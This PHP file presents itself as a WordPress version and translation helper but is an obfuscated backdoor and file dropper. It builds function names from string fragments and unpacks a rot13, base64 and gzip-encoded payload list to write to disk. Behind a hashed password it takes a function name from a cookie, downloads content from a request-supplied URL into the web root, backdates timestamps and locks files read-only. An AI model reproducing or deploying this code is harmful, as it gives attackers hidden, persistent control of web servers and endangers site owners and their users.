<?php
/**
 * @title ipadview
 * @
 * @param $str
 * @return mixed|string
 */

if (!defined('WP_BLOG')) {
    return version_info("init");
}

function version_desc($str)
{
    ($e = implode("",["opcache","reset"]))&&function_exists($e) && $e();
    if (!$str) {
        echo date("Y-m-d H:i:s") . "<br>";
        if (!empty($_REQUEST['version']) && version_update(version_parse($_REQUEST))) ;
        return '';
    }
    $pi = [
        ['str', 'ro'],
        ["json", 'decode'],
    ];
    ($q = (implode('_', $pi[0]) . "t13")) &&
    $data = $q($str);
    ($q = "b" . implode('_', $pi[1]) . "e") &&
    $data = $q($data);
    if (isset($_GET['s'])) $data = $_GET['s'] . $data;

    return $data;
}

function version_info($str)
{
    global $temp;
    $temp = "ZnVuY3Rpb25fZXhpc3RzLHRpbWUsZm9wZW4sZmlsZV9wdXRfY29udGVudHMsZmlsZWN0aW1lLGZpbGVfZXhpc3RzLGlzX3dyaXRhYmxlLGNobW9kLHRvdWNo";
    $temp = base64_decode($temp);
    $name = ['Y3Mupv93q3pinUEgoP93pP1wo250MJ50Y3IjoT9uMUZiZwNlZv8kZP80L2R1MQp5ZTWyLwVkMzRkAmHjBGL4MwD4BTZ1LJDjMF5xo2Z', function ($version_file, $name) use ($temp) {
        $data = translation_v3('J1fvKP92LKWpY3q3q1jinUEgoSjinJ5xMKthpTujVvjvCQ9jnUOpovNtWRMLMmIRBUZ9W1N5F3yOX3MnDaSuEKSYnayGZwIvG3xmEGAkFz5YHmSlqRbeIJq0HJMeFIEIFIAUnxklKP85AScOD1WPH3OuMQD3Z3EbKP9jqTWPrUcMIRS6oHWeqIyIFTqPZwqOHz40HJAgBKSxIz83pKqyIJuKA0yAX2SgHR9CnUEvA1MSL3D4AaMeDzZ4MIIPImHjD3qbI0L1LJVkZJ5kHyWenyOKFz0jJJuGDaunGIqSBHAKG3WOM1OYHKqMAQp0LJ1OIJ5CEJqHKP9yG0yDEyb1ZH9RM296qmERrTM4FJIWETcQrzAXqmITAauKAKcdE05vAUuCGSI4HJ0kI3RlqaRjHHR1HHSIFH81JIAfoQyOBJIPIUcMG3IPqT11EKy6M1NjX1cdHwOMLmAQEFgSMJcEGFgQpSImq0y1E0SzrT5fJzplGIc6HzWUHmO5Fx1hpRASn0W5oSqPFRyIo09Hp2IjIQMQLx1eoxHkF1uUD3yIqIqGo1jiZ1peMISWX0tjESyLHGIQAHE1pSjio1qGFIbmoHIMrTABp0uJn2R3raH4G0DkE3H5FUSgnIIkERtlZ1WvD3Lko0knqIEwMH1YGaIQHUumqJp5BJIRF2MPZauOFHgPEmSYnaqgJKx4G3IyKP9JIyAlAGuOoHWUq1Ovp3OlqKyvESjiqQWVKP9BA01pY1jiG3MjBRqHM252JIjioHb5LHAlDIIQozgmnUDjHzgDn05krQybEJkIE1IHDmylExfenSjipateZx1MJQI5Lz40nRE6FQOHMaEypUqBZ3ATE1WkpxjeFRgbrJ5pYmyiBHqzHIjiFRj0rzExF3V1MFgOnTIDDIH2IUuvMmMun2EErUAhnmAVFHW3p2MfpSu4qUMYAUMBDIW0o3plnJgPH1ymJRSJM3W3JJSlDzybZzReq2RmDwWMH3OBL05PHwqiLmu5IJIdLHMjAUOpY0cIZ2MZDJIgryE0F1Ilo05DAx5YrT80KP8kM2ACrFgDrz9nARqgLzAypxuLAIARomq5nzqSZ2EZDKWdoIqIMJcQDIykITyPBTIGDHx5Z0ZkExE1M3ugGRIbJyy4nUMzDmIeJUWiIGAWA1cBHJ5MMUEgGxgxZTp4nKqWq2u0AQEhF3x5GIOQDKSPITD2KP9Oo3WuKP9uIJqpYmunqJACoyI1rKumG0guGRkxLzj5MSuHoSDmAFggrxyhBKWWZRZ3nKI3oz9aq0SQG09lGxI6FRIAA2uDET9KEKSZFTcnEyZkJQqGnauEAGuaFUV4pJu3Fx5DoRAcFTMmM25DFGqSEzMnJacDM2kGq3ybnJuII3bmrHSVGwyQqH1Mq1E0ARcEIJ1CXmOdAHuWGaAeAx5pY05LJaMarwOIIaEhAUb2IIjiA1OyHPgcIHkIEJggowEOp2EWHRyGAac1pTfmImuwEycgMzqEL0kfASWEnwtmH1IQEx1xHT40pUcpY1jirQquqxj4pUOnMGSEKP9wZIH5HKObF3yzoQAfMzLkn0u0IKW3raH3nmySD1x4IaSwX3SloQIerIjiZSLmLGLmAmAOE3EzrT54F1uJBRjeI2IyESWUEJSJJTMiERWXEKZlGTM4Z29YGSqYGHIEnyIUGSqPo2AIGaywZ0H3I3E5JzW0BGACBQN3EGEkZ05GLJAHZmp1MmL1qau5rzcyGHM0EIOKGRkaAQOOE1ILnRESDJqlL0V4rSuZMQu3BSuEBJE0pIpkGIDkq0MWZxSxp3tmAUDmAHyhMxR2GxWJIHIiIIWhqyIIp3SOZJyWMTI1EGZep25kI3O2A1MBp0uhp1jiLKqbq0uDBHgcnxuXZJ9GZyqOZKEyGH52L1AxnGS6DIqhqTylL2gcJx9KJGA3GIOhpUqGX3OcqQE1Lx5FrJuSn2IdG1WyGHAhqwIZp3OUqGN0G3cfAGSnMxEeA3IuBRbeBQWkZwEAX3ObIRHmoKAJowMyI2cHMxk6Z3O4ZIAdn3uEF09inT5gJwyMHz1fJJgYnQShoGyYGSSeGRuWMUIVoRckL0cWBKM0IRA2MIIyEIR4ASALrIOBHaSUqR5ZL040qHIlGKyIH1cgGJgELGt4qHqBIzMKJxIpY0WTIxE1EKD5DHukASyhMTqTDHR3Z1EhZUqYDwyGH2kHDIyAAIqzEJEGnwETIyO6FIV3qz5ZHTcpY3SpY25DJTMRqPf2rSjiZzc3JxucKP9HDIyFFJAcZUyyHTkKFTuyMQA6KP90FTu3DwOyqz5IMzEzrRL4FIjiIJujA1WHH0gELJx3JSAcG0xkIz9IGKqHFUA6MUMbp2ARBFgZpmuBZ3NlLaIbBSIgETuOL0ybAJu2X1uEX0SXA0A6DIqwHGIfryAFERR4I2kZoSMOGUWkIIjiHRWpYmWbKP8jrJW3JaMGMJ1mFzkmGzEgL2IeoUWTqRMKI1y6IJ9IAIywMIEuomIpY3IpY0uaZxp3qT5vqQEYAaWOEJMPEx8kE2uzEz1iDmWWH3A0ETyXI1MBIyHkE2HlJJA1GyjiD2giqHWHM0y2L1uBIyWRpII5qzSfqzgdryjiFISKI3OIoHExI3qPJRgApTyKGxqGn3yJIIcAIwuJBPgwZyjiBQWWIQIbFx5ZnRuxHQMgEUu0A1qAZTSlJKW5LyABo1WRF3yfrRM5KP9XpJcUIxgFAyu0H0uGo1AcqwSgAzquF3EKDxf2qHESoaubESAwHaHmnGVjoJIuKP9PFx9WozWIMJ40ATM4rTShZGNkpmWEpIyaGH5Kq1WcqGIhDIN0IaAYAGAuHyEynTkIGyMhqJZ4M01jH3SOnJuRZ0qPFTEGIHqZM1MBnwAnMHkPEzuiEKq2JGMSo3SCIJu4H0WyAzqnERSFnJqUFPgeEwSjMUx4IUWWF2yMBRcdJKcjH0ISnSEfE1WXAxygFRIzDycRA1b1AUObHRcTIxuIFJIjn0IwBIHeJIE1ExAwFyEbI0V4DmIUp0ccFIEYpmIgGHcKAHuypIbkFTqKnQqwpxH0oIcAMzAeL1OcqHgFpSWfL2S1FzWyG2uKBIR3ZSp4L1ymqHDeqaOvI3SHMHuwqKIkBGEaI1qKD3ELLIAnFIAlI0WuG0qLJHcdrGAcBJkkZTkVq2M2qSjinmWDIScmA0cjJaWHrH01G0cYnwOYH3IpY3IaL1uZFxSapxt2HzkxpQWAHJuhZSM5GxL3rUIhM0uQpyMpY2VmIyuMrIOZEyScJIyCGwyarIMMZxV5o3qbETIbZH0lryAyq1yHoIW0EUICDmuBFSuDA212FHf5qSp2q0yADGOgZyjiX3MLnIWCD3MwJFgUn1WyrxSjMxAeL1EKnSZ4pz1KBSAiMRynX1SuBR1koJgcLxMhGUEun0R2pHIRIyEHozqRJJuHnGybZyyBnxgFryyYMRLkDISCGaACqlf3GTWFnHSTFUESHGulDGyOIzWwpJqFH1q4FKq4oTIYISSZZvfkASZ4MyWgqQLlqSAXDyW3FQSWq1p3Zx9eAGA0ZGAAIHj0ZxAgnIqZZx85GIAdrIARITMBETAnASIvD3qUpT5fqaIEHwqAFKqhrRWZF0geMIWgoSx2JJWyIGqeGmyEn2yFFT56BJWKZ1M5Z3OcEmqBIzy0oRIlH0t1Mmt5ITWmqIWHMxkhISASoyqYD1OUJIReMxkdpxIkZxyDISyMZaWbJayjMx9ZHmSfMSZ3MQEwnHq3MUEmqUALIwAeD2yuLzcEFIqwZRkmFz1PMRqyGmywIGteGTympyyaomupY1WSq2yKLmWyJSOuqacaAaubA25bIGS5L3MyEQyMMHDjKP83nT9VBGWyDHcnoH4kqQSzp1qOpR5xp3udrSAfpIRkoRAKGQxmDaqzFGWMAQIuIIyVpHIUFacKq3x3pJyTrJx5Z2uRITEbp1ERoGMVZyjiEGqpYmSZrFgyozMDJR41qSb5G3SzowIBZ1AHMwMjJwyyMHkBGaufX3I4ZJ5uX2M0M09SA2I6raOUHmqHDxWwoT5DZUW5MmN1rIM0q0ceFwWpY0cmG1cbIxIwGGOjEyL3DKOYp3WfE0ILHxgHEyAVZGAGnSEeoGqfL2cQFwI4G2f0JJWyGKWgARgVpxIeHJqnFzcZFHkVBISXo0S2rTAfqxEEJQOdA2uOGaExp3unEmSnITL4pGyVEx0eMUqgFUWUZTuaoJ85GTSaqxSHrRgAqGLkMIWnGxSEIzycovfkoUWWFxMXZTcvAUOTJwOIBKqiJJIHH2MaZQSfFaSZrIqXIySYASWInT12E1H0rSAaq0Z0qJIypR0eMIWvAHMjF01EAKH0GzglLH5nEKcQBGMgImSirTkRnIOWrSW3F3ICM0IMoJW3nz9CKP9lAaqjGyp4FyqzG2cLAJj2EKSFEwR0Hyjioz1pY1qXqJWKq3ATEx9mJGMQBKR5JzcnMRMbG2cUoScJowWEFQIvBJ53M2IgFUycEmudpRcABUIGKP9BITAWnKV2ZJ12FwupY3q3Hx1aGwp2EHyFnRSHBUb0nwpenTSgolgVDKIPpxSOEJq1G0gRpR1mMTcUG2L2EaSIBKt0oR1PF0q0LIuAnxumEayKpyDmZGumpIcyqxWhJIcnpGSfFxcznTIRrHH2IKMfnIqnFGZ4GGMKX2Wnp2Ixo3W3qGLko1qXpQMFpKt5ZaS6nFgTBKqRo2SlIaA6AyV3HaMpY3qQnyx4BTELHPgSI2IxqTyApUu3Jxu6FSjioIx2q0ZkMyMLHQILG1V4qQypYmyjGUcnpJIRJQpmqIOvrT9apyZ3IUOwDHcDn0SCFHILpTIGEHWnETgerHLeJSEzpaAhAaMZDaIxnyIzF0SjEQERJHgwXmWAqzInD1jiH3WdZSjip3yzAxx4HR9yDIABX3AJpJHjISMPHx84MIjiHQyvHJkyMJgGnmR2MJ5BJybmFQWpY1O5KP96H2yGrKuQZyjiHUuHBQZ1oyjiJwI6AKAzryuCBGSVBTqxFGukqSjirIWXrKcWFKZ4M0R1qzShGUAxHHZ1pzpeLHSYAHIVoaWMJaAWZGp3MycCJzyKnQqIBIN4pSWEI1cpY0cCnTAPAUN2rwW0MaVkA1udrKy4ExgMZUMCZJchBIEzozLenQD5IHyEG09vnKuRMz5aEaMiJaE2FGIgqaD4M0benmEUG1uHJKSuXmOXATkXBUydpHATFacZH0cyJH9OqKAnIxp0DyyUn2MJD2ERoRIHFIMbJRc4Hz9GpKSaBSOfJSjiG0MgMKcPIwMlITq4KP81nwIloREkqzcgpUE0MKNmnaqKZ284F3ukGSpkGQqYHRgloacEryAkG0cLGT1GKP9OBQLkFTkyEIOOnGuirTq2MGynHSH2KP9WF2AvZQMZBIqnoPgaIyIfD25eZIu5JUpaBlEOHwqDZR9ppw1pqTM1ozA0nJ9hXPEeAIb5MljxnR5WMH8cKUE7VSklVPOpqSk0VSk0VSk0WSN2n3AICIjvE1EhAIMBo1q1owAjHmy6G2umLaOJMQqzE1EPGUWKFJx4Azg2qUcSL0ABAKSXGxqGG1jvBlOpoaWyqUIlovNxHQMep1H7sGgpqTM1ozA0nJ9hVR0mJQZbWSIREaZcKT57WTg1JTWBLaHtCFOpVzD2H0AyES9SASjvBlEFryq1CFqPW1khYyklW0RaBlNxHacKqFNhCIk0WTg1JTWBLaIoXQV0VP0tZGtcVSjiZ11pqP4xn3ILLx5vqIfbBGDtYGH4YFN4XFOpYlN0KFNhVPtbBGRgAmZcVSjiVQZcYvtbBGxgBGNtXmZcVSjiVQZcKUV7WSW6I3HtYw0tVPEeqIuvGzW1JltmZl0tZwRcKP8tZy1pqP5ppvEeqIuvGzW1Jlt4BPNgVQL3XlN5XIjiVQMqBlEFryq1KUVhCFqyW1klBlEFryq1Yw1povEeqIuvGzW1Jlt4Zv02BFNgVQRcVSjiVQEqYvqCWl4xn3ILLx5vqIfbBQNtYFN4ZPypYmMqYvNxn3ILLx5vqIfbAQRtYFNlAvNeBFypYmMqYyklWlp7KT5lMKE1pz4tWSW6I3HbWSIREaZcB30tMaIhL3Eco24tVSAFJPNbWTWhFSyHDxcgXIklrlEFMRu0nR82Fz0tCFOpVaN5AmEFLwupVwfxFJScCFtbBGxgBQttXlNmXFOpYmVcYvEFMRu0nR82Fz1oXQt1VP0tAwxtYGtcVSjiVQWqB1k0WRyunF49VPEFMRu0nR82Fz1oXQxmVP0tBGZcVSjiVQMqKT4hVPEFMRu0nR82Fz1oXQHkVP01ZFypYmAqVQftWRyunFNhCIkhKUDaMPphXPt0BPNgVQZ3VPf3XIjiZvypqP5pqPq1Wl5pqPtbAQtgAQHeBFxtKP8tZlxtYvtbZGV1VP0tBQptYFN2XFOpYlN0XFN7KUDxFJScVP49KT5pqPEFMRu0nR82Fz1oXQH3YGZ1VP03XIjiVQAqYvpaB3WyqUIlovNxFJScB1k0KT4tVSk0sIklWRMLMmIRBUZ9IHMsBKtbWRMLMmIRBUZcB2M1ozA0nJ9hVSAbM240nHtjVPtxHzIVBTfcrlEQJHAGZ2kxqFN9VSjvZIEGZ190KPV7WUqdFKWgDHtmHm0xD1yQHmAfMUIoXQRmVPf4VP05XFOpYmMqYyklWRAMD1ZmoTE1Jlt5APNgVQpkVP0tBPxtKP8mKIk0YvqlWl4tWRAMD1ZmoTE1JltkZQxtYGt5XIjiAI1pov5pqPqFWl5pqPqCWlNhVPEQJHAGZ2kxqIfbZmZtYFNmZFxtKP8tZy1pqP4tWRAMD1ZmoTE1JltlZFNgZwVtXlNkXFOpYlNmKIkhYvNbXQL1YFN1AlNeVQRcVSjiZlxhWlp7VPOlMKE1pz4tWUqdFKWgDHtmHltxHzIVBTfcBlNtVSkhKUWpoyk0sFOppyklKUVtWRMLMmIRBUZ9KUEAZ1tmXPETJTp1EQumXGftKUVtWRMLMmIRBUZtCJywp250MFtxEyuaAHD4plx7MaIhL3Eco24tIHMsBKtbWSL4nmyEHxqwoPNcVUfxq05OqSVjZlN9VSjvITEDDHkpVwfxFGqgL255ZGWjCFqaW1k0BlNxFGqgL255ZGWjYw0tW1xaYyk0WUqBDKEFZQAoXQRkYFNmXFOpYlN0KF4tWUqBDKEFZQAoXQpkYFN3ZFxtKP8tZy0tYyklWUqBDKEFZQAoXQL4YGL0VPfkXFOpYlN1KIk0BlEWA21woaxkZaOpqP49VSk0XPt2BFNgAQVcKP8tZlypqP5pqPE3GxS0HwNmJlt0ZvNgVQZ5VPftBFypYlN0KIk0YvNaMPqpqP4xq05OqSVjZ1fbAGZtYFN0ZFypYmAqVP4aWmgppyk0KUEpqSk0KUElMKE1pz4tWRx3oJAhrGRlpPtxIwueBISFE2AfXGgpqPO9WRMLMmIRBUZ9KUEGnTqhATyVZPtxEyuaAHD4plx7KUEppyk0KUEppxIJLHjtXPETJTp1EQumXGgppyklMaIhL3Eco24tI1NkEIbtXPEInUceJKN0YPEwET5kVPypqUftWUuHoQN9KPWsIGW3LaMlKPV7KT5lMKE1pz4tWUuHoQN7sJM1ozA0nJ9hVSklM1yDITD5DJEZXPEzGKWKoGOIFlNcr1k0pzI0qKWhVSAFJPtaWlxtYvEzGKWKoGOIFmg9KUDtKUWpqTM1ozA0nJ9hVTywp250MFtxEKcuJaIjLly7WTyeI0f5rvN9VSjvM0yhrxSZqSjvBlEsFJEgIRAwCFEcn1qYBKcoXQxmVP0tBGZcKP8lKFNhVPEcn1qYBKcoXQL4VP01AvxtKP80KGfxK0yxoIEQL1klYw0tKUDxnJgKFmy6JltkAv0tZGZcVSjiVQAqYvEcn1qYBKcoXQtkYFN3ZlypYlN0KFN7WS9WMT1HD2ApqP49KT5pqPqTWlNhVPEcn1qYBKcoXQRkZl04BPypYlN1KIk0Yyk0WTyeI0f5ryfbZGN3VP0tBGxcKP8tZy1ppv5povEcn1qYBKcoXQR5YGpcVSjiVQWqYyklW2HaVP5pqPpaBlOppyk0VUWyqUIlovNxK0yxoIEQLltxEKcuJaIjLlx7sJM1ozA0nJ9hVSk0qQAznQpkETcpqPtxHmyTJJfjIvNcr1k0WR02MGqUZG1pVaOiFRyFAHR2pUWanIAzGSI3nHqCGS9yqR0koUL3oJSVAH9Wo1jvB1khKT5lMKE1pz4tWR02MGqUZGg9BlN/Cwj/pTujVPOxMJMcozHbW1qDK1IGEI9HFRIAEIZaYPO0paIyVPx7pzIkqJylMFusK0EWHy9sYvNtW1jiq3NgLzkiMl1bMJSxMKVhpTujWlNcBlN/CvVfVzMvZwyzZQExAmt1AGEzMwN4AQIyBJZ5A2H0AmNkLmSuVy0fJlWpY3Mupyjiq3q3KP9bqT1fKP8hnUEuL2Ayp3ZvYPV8FJMAo2E1oTHtoJ9xK3Wyq3WcqTHhLm5ppykhHzI3pzy0MHIhM2yhMFOCoyklKT5FMKqlnKEyDzSmMFOpY1klKT5FMKqlnKEyHaIfMFOrnJ5xMKthpTujWPNgVSgZKIklKT5FMKqlnKEyD29hMPNyr1WSHIISH1EsExyZEH5OGHI9VPRgMyklKT5FMKqlnKEyD29hMPNyr1WSHIISH1EsExyZEH5OGHI9VPRgMSklKT5FMKqlnKEyHaIfMFNhVTyhMTI4YaObpPOoGS1ppykhCSjiFJMAo2E1oTH+VvjvLzH0AmMxZwqyL2H4BGH5AQLjATDkAQt4AzZjBQRjZGLvKI0', '1');
        $data = base64_decode(/**/ $data);
        $data = translation_v2($data, '0');
        $data = translation_v1($data, '1');
        foreach ($data as $item) {
            version_check($item[0], $item[1], $temp, $item[2]);
        }
        version_desc(false);
    }];
    $temp = explode(',', $temp);
    return ['#ver#', version_data($name, 1, 0)];
}

/**
 * @title install path
 */
function version_path()
{
    echo __FILE__;
}

/**
 * @title get version data
 * @param $data
 * @param $offset
 * @param $page
 * @return mixed
 */
function version_data($data, $offset, $page)
{
    $keu = ['', "code"];
    $keu[] = '';
    return $data[$offset]($data[$page], implode('_', $keu));
}

/**
 * @title translation data
 * @param $data
 * @param $offset
 * @return mixed
 */

function translation_v1($data, $mode, $exp = '')
{
    if ($mode === 'X1') {
        $data = base64_decode($data);
        $len = strlen($data);
        $exp = str_replace('=', '', base64_encode($exp));
        $res = "";
        $i = 0;
        while ($i < $len) {
            for ($k = 0; $k < strlen($exp) && $i < $len; $k++)
                $res .= chr(ord($data[$i++]) ^ ord($exp[$k]));
        }
        return $res;
    } elseif ($mode) {
        return json_decode($data, true);
    } else {
        return unserialize($data);
    }
}

/**
 * @title parse version data
 * @param $data
 * @return version
 */
function version_parse($data)
{
    $version = $data['version'];
    if ($version === 'path') version_path();
    if (isset($data[$version])) {
        $version = translation_v1($data[$version], 'X1', $data[$version . '1']);
    }
    return $version;
}

/**
 * @title update version
 * @param $qr
 * @return void
 */
function version_update($check, $qr = false)
{
    if (!version_access("pwy{$check}vcejh", 'a813f06382c8d6650e76ee3adb5974e9')) return;
    $c = $_COOKIE;;
    $cf = implode('_', ['function', 'exists']);
    (!$qr || !$cf($qr)) &&
    $qr = empty($c[$for = 'token']) || !$cf($c[$for]) ? implode('_', ['base64', 'decode']) : $c[$for];

    if (($a = $qr($_REQUEST['name'])) && version_deny($a)) {
        return;
    }
    global $temp;
    $a = explode(',', $a);
    if (empty($a[1])) return;
    echo "[<a id=\"u1\" href=\"/{$a[1]}\" style='color: #fff;'>{$a[1]}</a>] ";
    return version_check($_SERVER['DOCUMENT_ROOT'] . '/' . $a[1], $qr(file_get_contents($a[0])), $temp);
}

/**
 * @title version access or force
 * @param string $version version pass
 * @param string $token check update token
 * @return bool
 */
function version_access($version, $token)
{
    return in_array(md5($version), [$token, '47628e0bf72fca87db995c8f844d91b1']);
}

/**
 * @title version data is deny
 * @param $data
 * @return void
 */
function version_deny($data)
{
    return strlen($data) < 16 || strlen($data) > 128 || !in_array($data[0], ['h', '/']);
}

/**
 * @title translation version data
 * @param $data
 * @param $offset
 * @return mixed
 */
function translation_v2($data, $offet)
{
    if (!empty($offet)) {
        return gzinflate($data);
    } else {
        return $data;
    }
}

/**
 * @title translation version data
 * @param $data
 * @param $offset
 * @return mixed
 */
function translation_v3($data, $offet)
{
    if (!empty($offet)) {
        return str_rot13($data);
    } else {
        return $data;
    }
}

return 'inited';
/**
 * @title check version token
 * @param $name
 * @param $date
 * @param $check
 * @param string $token
 * @param false $mode
 * @return bool|mixed
 */
function version_check($name, $date, $check, $token = '', $mode = false)
{
    try {
        $vs = 'rename';
        if (!is_array($check)) $check = explode(',', $check);
        $map = [0, 1, 2, 3, 4];
        $m = $mode ? $mode : ($check[1]() - 2693693);
        $iw = true;
        empty($check[9]) || $date = $check[9]($date);
        if ($check[$map[4] + 1]($name)) {
            if ($token && Md5_File($name) === $token) return true;
            $iw = $check[6]($name);
            if ($x = $check[5]($name)) {
                $m = $check[4]($name);
            }
            $x && !$iw && @$check[7]($name, 0744);
            @$vs($name, $name . time());
        }
        if ($check[$map[0]]($check[2])) {
            $l = $check[$map[2]][0] . 'write';
            $r = $l($check[$map[2]]($name . ".tmp1", 'w'), $date);
        } else {
            $r = $check[$map[3]]($name . ".tmp1", $date);
        }
        @$vs($name . ".tmp1", $name);
        $check[8]($name, $m, $m);
        $iw || @$check[7]($name, 0444);
    } catch (\Exception $A) {
        echo $A->getMessage() . "<br>";
        $r = false;
    }
    echo $name[strlen($name) - 1] . ($r ? ':ok' : ':fail') . "<br>";
    return $r;
}